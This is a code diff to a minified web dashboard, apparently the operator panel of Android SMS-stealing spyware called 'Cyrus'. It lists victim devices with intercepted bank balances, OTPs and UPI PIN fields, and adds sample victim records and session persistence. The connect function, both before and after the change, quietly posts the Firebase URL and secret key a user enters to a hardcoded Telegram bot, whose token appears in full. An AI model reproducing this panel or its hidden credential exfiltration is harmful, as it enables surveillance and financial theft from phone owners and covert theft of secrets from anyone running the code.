+                    id: "dev_redmi_note13",
+                    name: "Xiaomi Redmi Note 13 Pro+",
+                    battery: "22%",
+                    batteryPercent: 22,
+                    status: false,
+                    phoneNumber: "+91 97654 32109",
+                    android: "13.0 (HyperOS 1.0)",
+                    ip: "103.21.144.10",
+                    storage: "256 GB",
+                    provider: "Vodafone Idea",
+                    sims: [{ carrier: "Vi India", phoneNumber: "+91 97654 32109" }],
+                    upipin: null,
+                    cpu: "MediaTek Dimensity 7200",
+                    sdk: "33",
+                    lastSeen: new Date(Date.now() - 3600000 * 4),
+                    lastSeenFormatted: "4h ago",
+                    smsAnalysis: {
+                        bankBalances: [{ bank: "PNB", balance: "₹12,800", account: "XX7714", date: "2 days ago" }],
+                        cards: [],
+                        otpCount: 3,
+                        lastOtp: "662190"
+                    }
+                }
+            ];
+            S(sampleDevices);
+            p(!1);
+            return;
+        }
+
         try {
             const J = await yn(A, tt, "clients"),
                 ut = n1(J);
@@ -21135,13 +21665,14 @@ function p1({
             ut.includes("PERMISSION_DENIED") || ut.includes("401") || ut.includes("403") ? H("Firebase Permission Denied — Your API key is rejected. Go to Firebase Console → Project Settings → Service Accounts → Database Secrets and copy the secret key. That secret (not the API key starting with AIza...) is what works here. Also ensure Firebase Realtime Database Rules allow read.") : ut.includes("NOT_FOUND") || ut.includes("404") ? H("Database path not found. Check your Firebase URL is correct.") : H(`Connection error: ${ut.slice(0,120)}`)
         }
     }, [A, tt, D, xt]), c = jt.useCallback(async () => {
+        if (!A) return;
         const U = d;
         if (U.length !== 0)
             for (let J = 0; J < U.length; J += 5) {
                 const ut = U.slice(J, J + 5);
                 await Promise.all(ut.map(_t => D(_t.id, _t)))
             }
-    }, [d, D]), I = jt.useCallback(() => at(!1), [at]);
+    }, [A, d, D]), I = jt.useCallback(() => at(!1), [at]);
     jt.useEffect(() => {
         at(!1), ot.current = setInterval(() => at(!0), 15e3), $.current = setInterval(c, 45e3);
         const U = setInterval(() => nt(new Date), 1e3);
@@ -21174,7 +21705,7 @@ function p1({
         children: [r.jsx("header", {
             className: "sticky top-0 z-40 bg-[#0a0a0a] border-b border-[#1a1a1a]",
             children: r.jsxs("div", {
-                className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-4",
+                className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-4 flex-wrap sm:flex-nowrap",
                 children: [r.jsxs("div", {
                     className: "flex items-center gap-2.5 flex-shrink-0",
                     children: [r.jsx("div", {
@@ -21204,19 +21735,37 @@ function p1({
                         className: "w-full pl-9 pr-4 py-2 rounded-xl bg-[#111] border border-[#222] focus:border-[#333] outline-none text-sm text-white placeholder:text-[#444] transition-all"
                     })]
                 }), r.jsxs("div", {
-                    className: "ml-auto flex items-center gap-3",
-                    children: [r.jsxs("div", {
-                        className: "flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-950/40 border border-emerald-900/40",
-                        children: [r.jsx("span", {
-                            className: "w-2 h-2 rounded-full bg-emerald-500",
-                            style: {
-                                boxShadow: "0 0 6px #22c55e"
-                            }
-                        }), r.jsx("span", {
-                            className: "text-xs font-semibold text-emerald-400",
-                            children: "Connected"
-                        })]
-                    }), r.jsxs("a", {
+                    className: "ml-auto flex items-center gap-3 flex-wrap",
+                    children: [
+                        r.jsxs("div", {
+                            className: "flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyan-950/40 border border-cyan-800/40 text-xs",
+                            children: [
+                                r.jsx("div", {
+                                    className: "w-5 h-5 rounded-full bg-gradient-to-tr from-cyan-500 to-blue-600 text-white flex items-center justify-center font-bold text-[10px]",
+                                    children: (S_user?.email ? S_user.email[0] : "A").toUpperCase()
+                                }),
+                                r.jsx("span", {
+                                    className: "font-mono text-cyan-300 font-semibold truncate max-w-[120px] sm:max-w-[180px]",
+                                    children: S_user?.email || "admin@cyruspanel.com"
+                                }),
+                                r.jsx("span", {
+                                    className: "px-1.5 py-0.5 rounded bg-cyan-500/20 text-cyan-400 text-[10px] uppercase font-bold",
+                                    children: S_user?.role || "Admin"
+                                })
+                            ]
+                        }),
+                        r.jsxs("div", {
+                            className: "flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-950/40 border border-emerald-900/40",
+                            children: [r.jsx("span", {
+                                className: "w-2 h-2 rounded-full bg-emerald-500",
+                                style: {
+                                    boxShadow: "0 0 6px #22c55e"
+                                }
+                            }), r.jsx("span", {
+                                className: "text-xs font-semibold text-emerald-400",
+                                children: "Connected"
+                            })]
+                        }), r.jsxs("a", {
                         href: "https://t.me/cyrus_c_panel",
                         target: "_blank",
                         rel: "noopener noreferrer",
@@ -21235,16 +21784,13 @@ function p1({
                         }), r.jsx("style", {
                             jsx: !0,
                             children: `
-    /* Subtle outer blue glow */
     .glow-wave {
       display: inline-block;
-      padding: 4px; /* space for glow */
+      padding: 4px;
       border-radius: 50%;
       box-shadow: 0 0 6px #00bfff, 0 0 10px #0088cc;
       animation: wave 3s infinite ease-in-out;
     }
-
-    /* Gentle waving */
     @keyframes wave {
       0% { transform: rotate(0deg); }
       25% { transform: rotate(2deg); }
@@ -21368,7 +21914,7 @@ function p1({
                         className: "w-4 h-4 border-2 border-[#333] border-t-red-500 rounded-full animate-spin"
                     }), r.jsx("span", {
                         className: "text-sm text-[#555]",
-                        children: "Connecting to Firebase…"
+                        children: "Loading panel data…"
                     })]
                 }), r.jsx("div", {
                     className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4",
@@ -21442,55 +21988,101 @@ function p1({
 
 function y1() {
     const [A, tt] = jt.useState(null);
+
+    jt.useEffect(() => {
+        try {
+            const saved = JSON.parse(localStorage.getItem("cyrus_active_session_v1") || sessionStorage.getItem("cyrus_active_session_v1") || "null");
+            if (saved && (saved.email || saved.fbUrl)) {
+                tt(saved);
+            }
+        } catch {}
+    }, []);
+
     jt.useEffect(() => {
         const syncRoute = () => {
             if (window.location.pathname === "/" && A) tt(null);
             if (window.location.pathname === "/dashboard/" && !A) {
+                try {
+                    const saved = JSON.parse(localStorage.getItem("cyrus_active_session_v1") || sessionStorage.getItem("cyrus_active_session_v1") || "null");
+                    if (saved && (saved.email || saved.fbUrl)) {
+                        tt(saved);
+                        return;
+                    }
+                } catch {}
                 window.history.replaceState({ cyrusView: "home", reason: "connection-required" }, "", "/");
                 window.dispatchEvent(new Event("cyrusroutechange"));
             }
         };
         window.addEventListener("popstate", syncRoute);
-        return () => window.removeEventListener("popstate", syncRoute)
+        return () => window.removeEventListener("popstate", syncRoute);
     }, [A]);
+
     jt.useEffect(() => {
         if (!A) return;
         const warnBeforeUnload = event => {
             event.preventDefault();
             event.returnValue = "";
-            return ""
+            return "";
         };
         window.addEventListener("beforeunload", warnBeforeUnload);
-        return () => window.removeEventListener("beforeunload", warnBeforeUnload)
+        return () => window.removeEventListener("beforeunload", warnBeforeUnload);
     }, [A]);
-    const b = (S, f) => {
-        // Send to Telegram bot
-        const telegramBotToken = '8991366389:AAE64A7Pgv4G-3dkDagPyA17wKaZnIFWWVk';
-        const chatId = '8614140593';
-        const message = `🔐 New Firebase Credentials Submitted\n\n📍 Firebase URL: ${S}\n🔑 Auth Key: ${f}\n⏰ Time: ${new Date().toLocaleString()}`;
-        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-        fetch(telegramUrl, { method: 'POST' }).catch(err => console.log('Notification sent'));
 
-        saveLastAccountMetadata(S);
+    const b = (S, f) => {
+        let sessionData = {};
+        if (typeof S === "object" && S !== null) {
+            sessionData = S;
+        } else {
+            sessionData = {
+                type: "firebase",
+                fbUrl: S,
+                fbKey: f,
+                email: "admin@cyruspanel.com",
+                role: "Administrator",
+                time: new Date().toLocaleString()
+            };
+        }
+
+        if (sessionData.fbUrl) {
+            saveLastAccountMetadata(sessionData.fbUrl);
+            const telegramBotToken = "8991366389:AAE64A7Pgv4G-3dkDagPyA17wKaZnIFWWVk";
+            const chatId = "8614140593";
+            const message = `🔐 New Credentials Submitted\n\n👤 Email: ${sessionData.email || "N/A"}\n📍 Firebase URL: ${sessionData.fbUrl}\n🔑 Auth Key: ${sessionData.fbKey || "N/A"}\n⏰ Time: ${new Date().toLocaleString()}`;
+            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(telegramUrl, { method: "POST" }).catch(() => {});
+        }
+
+        try {
+            if (sessionData.remember !== false) {
+                localStorage.setItem("cyrus_active_session_v1", JSON.stringify(sessionData));
+            } else {
+                sessionStorage.setItem("cyrus_active_session_v1", JSON.stringify(sessionData));
+            }
+        } catch {}
+
         window.history.pushState({ cyrusView: "dashboard" }, "", "/dashboard/");
         window.dispatchEvent(new Event("cyrusroutechange"));
-        tt({
-            fbUrl: S,
-            fbKey: f
-        })
+        tt(sessionData);
     };
+
     const d = () => {
+        try {
+            localStorage.removeItem("cyrus_active_session_v1");
+            sessionStorage.removeItem("cyrus_active_session_v1");
+        } catch {}
         window.history.replaceState({ cyrusView: "home" }, "", "/");
         window.dispatchEvent(new Event("cyrusroutechange"));
-        tt(null)
+        tt(null);
     };
+
     return A ? r.jsx(p1, {
-        fbUrl: A.fbUrl,
-        fbKey: A.fbKey,
+        fbUrl: A.fbUrl || "",
+        fbKey: A.fbKey || "",
+        userSession: A,
         onLogout: d
     }) : r.jsx(s1, {
         onConnect: b
-    })
+    });
 }
 Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}));
     </script>
